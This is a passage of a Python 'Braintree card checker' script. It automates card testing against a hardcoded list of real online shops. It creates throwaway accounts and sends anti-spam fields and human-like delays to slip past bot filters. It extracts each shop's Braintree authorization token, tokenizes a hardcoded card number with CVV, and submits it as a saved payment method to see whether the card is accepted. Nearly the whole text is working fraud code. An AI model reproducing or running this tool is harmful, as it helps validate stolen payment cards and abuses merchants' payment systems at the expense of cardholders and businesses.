    resp_lower = resp_text.lower()
    
    # Check for errors
    if any(error in resp_lower for error in error_indicators):
        # But not false positives
        if 'already logged in' not in resp_lower:
            logger.warning("Registration may have failed - error indicators found")
            # Still check for success indicators in case it's a warning
    
    # Check for success
    if any(keyword in resp_lower for keyword in success_indicators):
        # Additional check - make sure we're not seeing these on error page
        if 'login' not in resp_lower or 'logout' in resp_lower:
            logger.info(f"Registration successful: {credentials.masked_email()}")
            return True
    
    logger.debug("Registration completed, checking login status")
    return False

async def check_login_status(session: aiohttp.ClientSession, url: str) -> bool:
    """
    Check if user is logged in.
    
    Args:
        session: aiohttp client session
        url: Site URL
        
    Returns:
        True if logged in
    """
    headers = get_headers(url)
    page_url = f'https://{url}/my-account/'
    
    # Small delay before check
    await asyncio.sleep(random.uniform(0.5, 1.0))
    
    text = await fetch_page_with_retry(session, page_url, headers)
    text_lower = text.lower()
    
    # Enhanced login status detection
    logged_in_indicators = [
        'logout', 'dashboard', 'my account', 'account dashboard',
        'my orders', 'edit account', 'addresses', 'payment methods'
    ]
    
    logged_out_indicators = [
        'login', 'register', 'sign in', 'log in'
    ]
    
    # Check if logged in
    if any(indicator in text_lower for indicator in logged_in_indicators):
        # Make sure we're not on login page
        if 'login form' not in text_lower or 'logout' in text_lower:
            return True
    
    return False

async def perform_login(session: aiohttp.ClientSession, url: str, 
                       credentials: AccountCredentials) -> bool:
    """
    Perform manual login.
    
    Args:
        session: aiohttp client session
        url: Site URL
        credentials: Account credentials
        
    Returns:
        True if login successful
    """
    headers = get_headers(url)
    page_url = f'https://{url}/my-account/'
    
    text = await fetch_page_with_retry(session, page_url, headers)
    lnonce = extract_with_regex_enhanced('login_nonce', text, 'woocommerce-login-nonce')
    
    if not lnonce:
        logger.error("Login nonce not found")
        return False
    
    login_data = (
        f"username={credentials.email}&"
        f"password={credentials.password}&"
        f"woocommerce-login-nonce={lnonce}&"
        f"_wp_http_referer=%2Fmy-account%2F&"
        f"login=Log+in"
    )
    
    headers = get_headers(url, f'https://{url}/my-account/', is_post=True)
    headers['content-type'] = 'application/x-www-form-urlencoded; charset=UTF-8'
    headers['content-length'] = str(len(login_data.encode('utf-8')))
    
    # Add delay before POST to simulate human typing
    await asyncio.sleep(random.uniform(2.0, 4.0))
    
    logger.debug(f"Attempting login for {credentials.masked_email()}")
    login_text = await post_data_with_retry(session, page_url, login_data, headers)
    
    # Wait after POST
    await asyncio.sleep(random.uniform(1.0, 2.0))
    
    # Enhanced success detection
    login_lower = login_text.lower()
    
    success_indicators = [
        'logout', 'dashboard', 'my account', 'account dashboard',
        'welcome', 'hello', 'my orders', 'edit account',
        'addresses', 'account details', 'payment methods'
    ]
    
    error_indicators = [
        'incorrect password', 'invalid username', 'login failed',
        'error logging in', 'incorrect credentials', 'wrong password',
        'user not found', 'email not found'
    ]
    
    # Check for errors first
    if any(error in login_lower for error in error_indicators):
        logger.error(f"Login failed - error message detected: {credentials.masked_email()}")
        return False
    
    # Check for success
    if any(keyword in login_lower for keyword in success_indicators):
        # Additional verification - check we're not on login page
        if ('login' not in login_lower or 'logout' in login_lower):
            logger.info(f"Login successful: {credentials.masked_email()}")
            return True
    
    logger.error("Login failed - no success indicators found")
    return False

async def register_and_login(session: aiohttp.ClientSession, url: str) -> Tuple[bool, APBCTFields, AccountCredentials]:
    """
    Register new account and login.
    
    Args:
        session: aiohttp client session
        url: Site URL
        
    Returns:
        Tuple of (success, APBCTFields, AccountCredentials)
    """
    try:
        credentials = await generate_account_credentials()
        
        # Get registration nonce
        rnonce, apbct_fields = await get_register_nonce(session, url)
        if not rnonce:
            logger.error("Could not get registration nonce")
            return False, apbct_fields, credentials
        
        # Perform registration
        reg_success = await perform_registration(session, url, credentials, rnonce, apbct_fields)
        if reg_success:
            return True, apbct_fields, credentials
        
        # Check if already logged in
        if await check_login_status(session, url):
            logger.info("Already logged in after registration")
            return True, apbct_fields, credentials
        
        # Attempt manual login
        login_success = await perform_login(session, url, credentials)
        if login_success:
            return True, apbct_fields, credentials
        
        logger.error("Registration/login failed")
        return False, apbct_fields, credentials

    except Exception as e:
        logger.exception(f"Registration/Login error: {str(e)}")
        raise AuthenticationError(f"Authentication failed: {str(e)}") from e

async def update_billing_address(session: aiohttp.ClientSession, url: str, 
                                apbct_fields: APBCTFields) -> bool:
    """
    Update billing address.
    
    Args:
        session: aiohttp client session
        url: Site URL
        apbct_fields: Anti-spam fields
        
    Returns:
        True if update successful
    """
    try:
        headers = get_headers(url)
        page_url = f'https://{url}/my-account/edit-address/billing/'
        
        logger.debug("Fetching billing address page")
        text = await fetch_page_with_retry(session, page_url, headers)
        
        anonce = extract_with_regex_enhanced('billing_nonce', text, 'woocommerce-edit-address-nonce')
        if not anonce:
            logger.warning("Billing nonce not found, skipping address update")
            return False
        
        # Update APBCT fields if not already set
        if not apbct_fields.apbct_visible or not apbct_fields.ct_no_cookie:
            new_fields = extract_apbct_fields(text)
            if new_fields.apbct_visible:
                apbct_fields.apbct_visible = new_fields.apbct_visible
            if new_fields.ct_no_cookie:
                apbct_fields.ct_no_cookie = new_fields.ct_no_cookie
        
        rand_email_num = random.randint(10000, 99999)
        billing_data_parts = [
            f"billing_first_name=John",
            f"billing_last_name=Doe",
            f"billing_company=TestCo",
            f"billing_country=US",
            f"billing_address_1=123+Main+St",
            f"billing_address_2=",
            f"billing_city=New+York",
            f"billing_state=NY",
            f"billing_postcode=10001",
            f"billing_phone=12125551234",
            f"billing_email=user{rand_email_num}@gmail.com",
            f"save_address=Save+address",
            f"woocommerce-edit-address-nonce={anonce}",
            f"_wp_http_referer=%2Fmy-account%2Fedit-address%2Fbilling%2F",
            f"action=edit_address"
        ]
        
        apbct_param, ct_param = apbct_fields.to_params()
        if apbct_param:
            billing_data_parts.append(apbct_param)
        if ct_param:
            billing_data_parts.append(ct_param)
        
        post_data_str = "&".join(billing_data_parts)

        headers = get_headers(url, f'https://{url}/my-account/edit-address/billing/', is_post=True)
        headers['content-type'] = 'application/x-www-form-urlencoded; charset=UTF-8'
        headers['content-length'] = str(len(post_data_str.encode('utf-8')))
        
        logger.debug("Updating billing address")
        await post_data_with_retry(session, page_url, post_data_str, headers)
        logger.info("Billing address updated successfully")
        return True
        
    except Exception as e:
        logger.warning(f"Billing address update failed (non-critical): {str(e)}")
        return False

async def get_payment_method_nonce(session: aiohttp.ClientSession, url: str) -> Tuple[Optional[str], APBCTFields]:
    """
    Get payment method nonce from add payment method page with improved detection.
    
    Args:
        session: aiohttp client session
        url: Site URL
        
    Returns:
        Tuple of (nonce, APBCTFields)
        
    Raises:
        TokenError: If nonce cannot be retrieved
    """
    headers = get_headers(url, f'https://{url}/my-account/')
    page_url = f'https://{url}/my-account/add-payment-method/'
    
    logger.debug("Fetching add payment method page")
    text = await fetch_page_with_retry(session, page_url, headers)
    
    # Check if logged in
    if 'login' in text.lower() and 'logout' not in text.lower():
        logger.error("Session expired - not logged in")
        raise AuthenticationError("Session expired - not logged in")
    
    # Check if site uses NMI Gateway instead of Braintree
    if 'nmi_gateway' in text.lower() or 'nmi-gateway' in text.lower():
        logger.warning("Site uses NMI Gateway, not Braintree - skipping")
        raise TokenError("Site uses NMI Gateway payment method, not Braintree")
    
    wnonce = extract_with_regex_enhanced('payment_method_nonce', text, 'woocommerce-add-payment-method-nonce')
    if not wnonce:
        logger.error("Payment method nonce not found")
        # Try to debug - check what payment methods are available
        if 'braintree' not in text.lower():
            logger.warning("Braintree not found on add-payment-method page")
        raise TokenError("Failed to get payment method nonce")
    
    apbct_fields = extract_apbct_fields(text)
    logger.debug("Payment method nonce retrieved")
    
    return wnonce, apbct_fields

async def get_braintree_authorization_token(session: aiohttp.ClientSession, url: str, 
                                            apbct_fields: APBCTFields) -> str:
    """
    Get Braintree authorization token with improved methods.
    
    Args:
        session: aiohttp client session
        url: Site URL
        apbct_fields: Anti-spam fields
        
    Returns:
        Authorization fingerprint
        
    Raises:
        TokenError: If token cannot be retrieved
    """
    headers = get_headers(url)
    
    # Try payment-methods page first (some sites have token there)
    payment_methods_url = f'https://{url}/my-account/payment-methods/'
    try:
        text = await fetch_page_with_retry(session, payment_methods_url, headers)
        
        # Check for embedded token on payment-methods page
        braintree_token = extract_with_regex('braintree_client_token', text)
        if not braintree_token:
            braintree_token = extract_with_regex('braintree_client_token_alt', text)
        
        if braintree_token:
            logger.debug("Found embedded token on payment-methods page")
            try:
                decoded = base64.b64decode(braintree_token).decode("utf-8")
                auth_fingerprint = extract_with_regex('auth_fingerprint', decoded)
                if auth_fingerprint:
                    logger.info("Authorization fingerprint extracted from embedded token (payment-methods)")
                    return auth_fingerprint
            except Exception as e:
                logger.debug(f"Failed to decode embedded token from payment-methods: {str(e)}")
        
        # Get client token nonce from payment-methods page
        cnonce = extract_with_regex('client_token_nonce', text)
        if not cnonce:
            cnonce = extract_with_regex('client_token_nonce_alt', text)
        
        if cnonce:
            logger.debug("Getting Braintree client token via AJAX (from payment-methods page)")
            post_data_str = f"action=wc_braintree_credit_card_get_client_token&nonce={cnonce}"
            
            ajax_headers = get_headers(url, payment_methods_url, is_post=True)
            ajax_headers['content-type'] = 'application/x-www-form-urlencoded; charset=UTF-8'
            ajax_headers['x-requested-with'] = 'XMLHttpRequest'
            ajax_headers['accept'] = '*/*'
            
            ajax_url = f'https://{url}/wp-admin/admin-ajax.php'
            
            try:
                ajax_text = await post_data_with_retry(session, ajax_url, post_data_str, ajax_headers)
                
                data_token = extract_with_regex('data_token', ajax_text)
                if data_token:
                    decoded = base64.b64decode(data_token).decode("utf-8")
                    auth_fingerprint = extract_with_regex('auth_fingerprint', decoded)
                    if auth_fingerprint:
                        logger.info("Authorization fingerprint extracted from AJAX token")
                        return auth_fingerprint
            except Exception as e:
                logger.debug(f"AJAX method failed: {str(e)}")
    
    except Exception as e:
        logger.debug(f"Payment-methods page check failed: {str(e)}")
    
    # Try add-payment-method page
    page_url = f'https://{url}/my-account/add-payment-method/'
    text = await fetch_page_with_retry(session, page_url, headers)
    
    # Update APBCT fields
    if not apbct_fields.apbct_visible or not apbct_fields.ct_no_cookie:
        new_fields = extract_apbct_fields(text)
        if new_fields.apbct_visible:
            apbct_fields.apbct_visible = new_fields.apbct_visible
        if new_fields.ct_no_cookie:
            apbct_fields.ct_no_cookie = new_fields.ct_no_cookie
    
    # Try embedded token on add-payment-method page
    braintree_token = extract_with_regex('braintree_client_token', text)
    if not braintree_token:
        braintree_token = extract_with_regex('braintree_client_token_alt', text)
    
    if braintree_token:
        logger.debug("Using embedded Braintree token from add-payment-method page")
        try:
            decoded = base64.b64decode(braintree_token).decode("utf-8")
            auth_fingerprint = extract_with_regex('auth_fingerprint', decoded)
            if auth_fingerprint:
                logger.info("Authorization fingerprint extracted from embedded token")
                return auth_fingerprint
        except Exception as e:
            logger.warning(f"Failed to decode embedded token: {str(e)}")
    
    # Try AJAX method with add-payment-method page
    cnonce = extract_with_regex('client_token_nonce', text)
    if not cnonce:
        cnonce = extract_with_regex('client_token_nonce_alt', text)
    
    if cnonce:
        logger.debug("Getting Braintree client token via AJAX (from add-payment-method page)")
        post_data_str = f"action=wc_braintree_credit_card_get_client_token&nonce={cnonce}"
        
        ajax_headers = get_headers(url, page_url, is_post=True)
        ajax_headers['content-type'] = 'application/x-www-form-urlencoded; charset=UTF-8'
        ajax_headers['x-requested-with'] = 'XMLHttpRequest'
        ajax_headers['accept'] = '*/*'
        
        ajax_url = f'https://{url}/wp-admin/admin-ajax.php'
        
        try:
            ajax_text = await post_data_with_retry(session, ajax_url, post_data_str, ajax_headers)
            
            data_token = extract_with_regex('data_token', ajax_text)
            if data_token:
                decoded = base64.b64decode(data_token).decode("utf-8")
                auth_fingerprint = extract_with_regex('auth_fingerprint', decoded)
                if auth_fingerprint:
                    logger.info("Authorization fingerprint extracted from AJAX token")
                    return auth_fingerprint
        except Exception as e:
            logger.warning(f"AJAX method failed: {str(e)}")
            raise TokenError(f"AJAX method failed: {str(e)}")
    
    raise TokenError("No Braintree client token method found")

async def tokenize_card_with_braintree(session: aiohttp.ClientSession, 
                                       card: CardDetails,
                                       auth_fingerprint: str) -> Tuple[str, str]:
    """
    Tokenize credit card with Braintree API.
    
    Args:
        session: aiohttp client session
        card: Card details
        auth_fingerprint: Authorization fingerprint
        
    Returns:
        Tuple of (token, brand_code)
        
    Raises:
        TokenError: If tokenization fails
    """
    braintree_headers = Config.BRAINTREE_HEADERS.copy()
    braintree_headers["authorization"] = f"Bearer {auth_fingerprint}"

    graphql_query = (
        "mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) {"
        "  tokenizeCreditCard(input: $input) {"
        "    token"
        "    creditCard {"
        "      bin"
        "      brandCode"
        "      last4"
        "      cardholderName"
        "      expirationMonth"
        "      expirationYear"
        "      binData {"
        "        prepaid"
        "        healthcare"
        "        debit"
        "        durbinRegulated"
        "        commercial"
        "        payroll"
        "        issuingBank"
        "        countryOfIssuance"
        "        productId"
        "      }"
        "    }"
        "  }"
        "}"
    )
    
    payload = {
        "clientSdkMetadata": {
            "source": "client",
            "integration": "dropin2",
            "sessionId": str(uuid.uuid4()),
        },
        "query": graphql_query,
        "variables": {
            "input": {
                "creditCard": {
                    "number": card.number,
                    "expirationMonth": card.expiry_month,
                    "expirationYear": card.expiry_year,
                    "cvv": card.cvv,
                    "cardholderName": "John Doe",
                    "billingAddress": {"postalCode": "10001"},
                },
                "options": {"validate": False},
            }
        },
        "operationName": "TokenizeCreditCard",
    }

    logger.debug(f"Tokenizing card: {card.masked_number()}")
    
    try:
        async with session.post(
            "https://payments.braintree-api.com/graphql",
            headers=braintree_headers,
            json=payload
        ) as response:
            if response.status != 200:
                error_msg = f"NONCE_FETCH_FAILED: HTTP {response.status}"
                logger.error(error_msg)
                raise TokenError(error_msg)
            
            text = await response.text()
            token = extract_with_regex('token', text)
            brand_code = extract_with_regex('brand_code', text)
            
            if not token:
                logger.error("Token not found in Braintree response")
                raise TokenError("Failed to get token from Braintree")
            
            if not brand_code:
                brand_code = "master-card"
                logger.debug("Brand code not found, using default")
            
            logger.info(f"Card tokenized successfully: {card.masked_number()} ({brand_code})")
            return token, brand_code
            
    except aiohttp.ClientError as e:
        logger.error(f"Network error during tokenization: {str(e)}")
        raise TokenError(f"Tokenization failed: {str(e)}") from e

async def submit_payment_method(session: aiohttp.ClientSession, url: str,
                                token: str, brand_code: str, wnonce: str,
                                apbct_fields: APBCTFields) -> PaymentResult:
    """
    Submit payment method to WooCommerce.
    
    Args:
        session: aiohttp client session
        url: Site URL
        token: Payment token
        brand_code: Card brand code
        wnonce: Payment method nonce
        apbct_fields: Anti-spam fields
        
    Returns:
        PaymentResult object
    """
    payment_data_parts = [
        f"payment_method=braintree_credit_card",
        f"wc-braintree-credit-card-card-type={brand_code}",
        f"wc-braintree-credit-card-3d-secure-enabled=",
        f"wc-braintree-credit-card-3d-secure-verified=",
        f"wc-braintree-credit-card-3d-secure-order-total=0.00",
        f"wc_braintree_credit_card_payment_nonce={token}",
        f"wc_braintree_device_data=",
        f"wc-braintree-credit-card-tokenize-payment-method=true",
        f"woocommerce-add-payment-method-nonce={wnonce}",
        f"_wp_http_referer=%2Fmy-account%2Fadd-payment-method%2F",
        f"woocommerce_add_payment_method=1"
    ]
    
    apbct_param, ct_param = apbct_fields.to_params()
    if apbct_param:
        payment_data_parts.append(apbct_param)
    if ct_param:
        payment_data_parts.append(ct_param)
    
    post_data_str = "&".join(payment_data_parts)

    headers = get_headers(url, f'https://{url}/my-account/add-payment-method/', is_post=True)
    headers['content-type'] = 'application/x-www-form-urlencoded; charset=UTF-8'
    headers['content-length'] = str(len(post_data_str.encode('utf-8')))
    
    page_url = f'https://{url}/my-account/add-payment-method/'
    
    logger.debug("Submitting payment method")
    text = await post_data_with_retry(session, page_url, post_data_str, headers)
    
    result = analyze_response_text(text)
    logger.info(f"Payment result: {result}")
    return result

async def process_card(session: aiohttp.ClientSession, url: str, 
                      card: CardDetails, apbct_fields: APBCTFields) -> PaymentResult:
    """
    Process credit card payment.
    
    Args:
        session: aiohttp client session
        url: Site URL
        card: Card details
        apbct_fields: Anti-spam fields
        
    Returns:
        PaymentResult object
        
    Raises:
        BraintreeError: If processing fails
    """
    try:
        logger.info(f"Processing card: {card.masked_number()}")
        
        # Update billing address (non-critical)
        await update_billing_address(session, url, apbct_fields)
        
        # Get payment method nonce
        wnonce, updated_apbct_fields = await get_payment_method_nonce(session, url)
        if updated_apbct_fields.apbct_visible:
            apbct_fields.apbct_visible = updated_apbct_fields.apbct_visible
        if updated_apbct_fields.ct_no_cookie:
            apbct_fields.ct_no_cookie = updated_apbct_fields.ct_no_cookie
        
        # Get Braintree authorization token
        auth_fingerprint = await get_braintree_authorization_token(session, url, apbct_fields)
        
        # Tokenize card
        token, brand_code = await tokenize_card_with_braintree(session, card, auth_fingerprint)
        
        # Submit payment method
        result = await submit_payment_method(session, url, token, brand_code, wnonce, apbct_fields)
        result.card_brand = brand_code
        
        return result
        
    except (TokenError, AuthenticationError, NetworkError) as e:
        logger.exception(f"Payment processing error: {str(e)}")
        return PaymentResult(PaymentStatus.ERROR, f"Processing failed: {str(e)}")
    except Exception as e:
        logger.exception(f"Unexpected error during payment processing: {str(e)}")
        return PaymentResult(PaymentStatus.ERROR, f"Unexpected error: {str(e)[:100]}")

# ============================================================================
# MAIN FUNCTION
# ============================================================================

async def test_single_site(site_url: str, card: CardDetails):
    """
    Test a single site with comprehensive 4-step verification.
    
    Args:
        site_url: Site URL to test
        card: Card details
        
    Returns:
        Dictionary with test results
    """
    results = {
        'site': site_url,
        'step1_registration': 'PENDING',
        'step2_login': 'PENDING',
        'step3_billing': 'PENDING',
        'step4_payment_method': 'PENDING',
        'overall': 'FAIL',
        'error': None
    }
    
    try:
        print(f"\n[TESTING] {site_url}")
        print("=" * 80)
        
        connector = aiohttp.TCPConnector(
            limit=Config.CONNECTOR_LIMIT,
            limit_per_host=Config.CONNECTOR_LIMIT_PER_HOST,
            ttl_dns_cache=300,
            force_close=False
        )
        timeout = aiohttp.ClientTimeout(
            total=Config.TOTAL_TIMEOUT,
            connect=Config.REQUEST_TIMEOUT,
            sock_read=Config.REQUEST_TIMEOUT
        )
        cookie_jar = aiohttp.CookieJar()
        
        async with aiohttp.ClientSession(
            connector=connector,
            timeout=timeout,
            cookie_jar=cookie_jar
        ) as session:
            
            # STEP 1: Registration
            print("[STEP 1] Registration...")
            try:
                credentials = await generate_account_credentials()
                rnonce, apbct_fields = await get_register_nonce(session, site_url)
                
                if not rnonce:
                    print("  [FAIL] No registration nonce found")
                    results['step1_registration'] = 'FAIL'
                    results['error'] = 'No registration nonce'
                    return results
                
                reg_success = await perform_registration(session, site_url, credentials, rnonce, apbct_fields)
                
                if reg_success:
                    print("  [PASS] Registration successful")
                    results['step1_registration'] = 'PASS'
                else:
                    print("  [FAIL] Registration failed")
                    results['step1_registration'] = 'FAIL'
                    results['error'] = 'Registration failed'
                    return results
                    
            except Exception as e:
                err_msg = str(e)[:100]
                print(f"  [ERROR] {err_msg}")
                results['step1_registration'] = 'ERROR'
                results['error'] = err_msg
                return results
            
            # STEP 2: Login verification
            print("[STEP 2] Login Verification...")
            try:
                await asyncio.sleep(2)
                logged_in = await check_login_status(session, site_url)
                
                if logged_in:
                    print("  [PASS] Login verified")
                    results['step2_login'] = 'PASS'
                else:
                    print("  [FAIL] Not logged in")
                    results['step2_login'] = 'FAIL'
                    results['error'] = 'Not logged in'
                    return results
                    
            except Exception as e:
                err_msg = str(e)[:100]
                print(f"  [ERROR] {err_msg}")
                results['step2_login'] = 'ERROR'
                results['error'] = err_msg
                return results
            
            # STEP 3: Billing address
            print("[STEP 3] Billing Address...")
            try:
                billing_success = await update_billing_address(session, site_url, apbct_fields)
                
                if billing_success:
                    print("  [PASS] Billing created")
                    results['step3_billing'] = 'PASS'
                else:
                    print("  [SKIP] Billing skipped")
                    results['step3_billing'] = 'SKIP'
                    
            except Exception as e:
                print("  [SKIP] Billing skipped")
                results['step3_billing'] = 'SKIP'
            
            # STEP 4: Add payment method
            print("[STEP 4] Payment Method...")
            try:
                wnonce, updated_apbct = await get_payment_method_nonce(session, site_url)
                
                if not wnonce:
                    print("  [FAIL] No payment nonce")
                    results['step4_payment_method'] = 'FAIL'
                    results['error'] = 'No payment nonce'
                    return results
                
                auth_fingerprint = await get_braintree_authorization_token(session, site_url, updated_apbct)
                token, brand_code = await tokenize_card_with_braintree(session, card, auth_fingerprint)
                result = await submit_payment_method(session, site_url, token, brand_code, wnonce, updated_apbct)
                
                if result.status == PaymentStatus.APPROVED:
                    print(f"  [PASS] {result.message}")
                    results['step4_payment_method'] = 'PASS'
                    results['overall'] = 'SUCCESS'
                else:
                    print(f"  [{result.status.value}] {result.message}")
                    results['step4_payment_method'] = result.status.value
                    results['error'] = result.message
                    results['overall'] = result.status.value
                
            except Exception as e:
                err_msg = str(e)[:100]
                print(f"  [ERROR] {err_msg}")
                results['step4_payment_method'] = 'ERROR'
                results['error'] = err_msg
                return results
                
    except Exception as e:
        err_msg = str(e)[:100]
        print(f"[ERROR] {err_msg}")
        results['error'] = err_msg
    
    return results

async def main():
    """
    Main entry point - Tests Braintree sites with enhanced configuration support.
    """
    print("=" * 100)
    print("BRAINTREE CARD CHECKER - ENHANCED BATCH TESTING")
    print("=" * 100)
    
    # Load configuration
    config_mgr = get_config_manager()
    circuit_breaker = get_circuit_breaker()
    
    # Get enabled sites from config, or use default list
    enabled_sites = config_mgr.get_enabled_sites()
    
    if not enabled_sites:
        # Fallback to default 12 sites if config doesn't specify
        enabled_sites = [
            'ads.premierguitar.com',
            'dicksondata.com',
            'djcity.com.au',
            'kolarivision.com',
            'lindywell.com',
            'naturalacneclinic.com',
            'perennialsfabrics.com',
            'shop.bullfrogspas.com',
            'store.puritywoods.com',
            'strymon.net',
            'truedark.com',
            'winixamerica.com'
        ]
        print("[INFO] Using default site list (12 sites)")
    else:
        print(f"[INFO] Loaded {len(enabled_sites)} enabled sites from config")
    
    # Test card
    CARD = '5403850087142766|11|2028|427'
    
    try:
        parts = CARD.split("|")
        card = CardDetails(
            number=parts[0],
            expiry_month=parts[1],
            expiry_year=parts[2],
            cvv=parts[3]
        )
        
        print(f"\nCard: {card.masked_number()} | Expiry: {parts[1]}/{parts[2]}")
        print(f"Total Sites: {len(enabled_sites)}")
        print("=" * 100)
        
        all_results = []
        
        # Test each site
        for i, site in enumerate(enabled_sites, 1):
            print(f"\n[{i}/{len(enabled_sites)}]")
            
            # Check circuit breaker
            if not circuit_breaker.can_attempt(site):
                print(f"[SKIP] Circuit breaker OPEN for {site} - skipping")
                all_results.append({
                    'site': site,
                    'step1_registration': 'SKIP',
                    'step2_login': 'SKIP',
                    'step3_billing': 'SKIP',
                    'step4_payment_method': 'SKIP',
                    'overall': 'SKIP',
                    'error': 'Circuit breaker open'
                })
                continue
            
            # Get site-specific config
            site_config = config_mgr.get_site_config(site)
            
            result = await test_single_site(site, card)
            all_results.append(result)
            
            # Update circuit breaker
            if result['overall'] == 'SUCCESS':
                circuit_breaker.record_success(site)
            elif result['overall'] in ['FAIL', 'ERROR']:
                circuit_breaker.record_failure(site)
            
            # Use site-specific delay
            delay = site_config.delay_between_requests
            await asyncio.sleep(delay)
        
        # Final Summary
        print("\n" + "=" * 100)
        print("FINAL RESULTS SUMMARY")
        print("=" * 100)
        
        fully_working = []
        partial_working = []
        not_working = []
        skipped = []
        
        for r in all_results:
            if r['overall'] == 'SUCCESS':
                fully_working.append(r)
            elif r['overall'] == 'SKIP':
                skipped.append(r)
            elif r['step1_registration'] == 'PASS' or r['step2_login'] == 'PASS':
                partial_working.append(r)
            else:
                not_working.append(r)
        
        print(f"\n[FULLY WORKING - ALL 4 STEPS] ({len(fully_working)} sites):")
        if fully_working:
            for r in fully_working:
                print(f"  [SUCCESS] {r['site']}")
                print(f"    Steps: {r['step1_registration']} | {r['step2_login']} | {r['step3_billing']} | {r['step4_payment_method']}")
        else:
            print("  None")
        
        print(f"\n[PARTIAL WORKING] ({len(partial_working)} sites):")
        if partial_working:
            for r in partial_working:
                print(f"  {r['site']}")
                print(f"    Steps: {r['step1_registration']} | {r['step2_login']} | {r['step3_billing']} | {r['step4_payment_method']}")
                if r['error']:
                    print(f"    Error: {r['error']}")
        else:
            print("  None")
        
        if skipped:
            print(f"\n[SKIPPED] ({len(skipped)} sites):")
            for r in skipped:
                print(f"  {r['site']}: {r['error'] or 'Circuit breaker'}")
        
        print(f"\n[NOT WORKING] ({len(not_working)} sites):")
        if not_working:
            for r in not_working:
                print(f"  {r['site']}: {r['error'] or 'Unknown'}")
        else:
            print("  None")
        
        print(f"\n>>> FINAL: {len(fully_working)} Working | {len(partial_working)} Partial | {len(not_working)} Failed | {len(skipped)} Skipped")
        print("=" * 100)
            
    except KeyboardInterrupt:
        logger.info("Process interrupted by user")
        print("\n[INFO] Process interrupted by user")
    except Exception as e:
        logger.exception(f"Unexpected error in main: {str(e)}")
        print(f"[ERROR] Unexpected error: {str(e)}")

if __name__ == "__main__":
    try:
        asyncio.run(main())
    except KeyboardInterrupt:
        print("\n[INFO] Application terminated by user")
    except Exception as e:
        logger.exception(f"Fatal error: {str(e)}")
        print(f"[FATAL] Application error: {str(e)}")
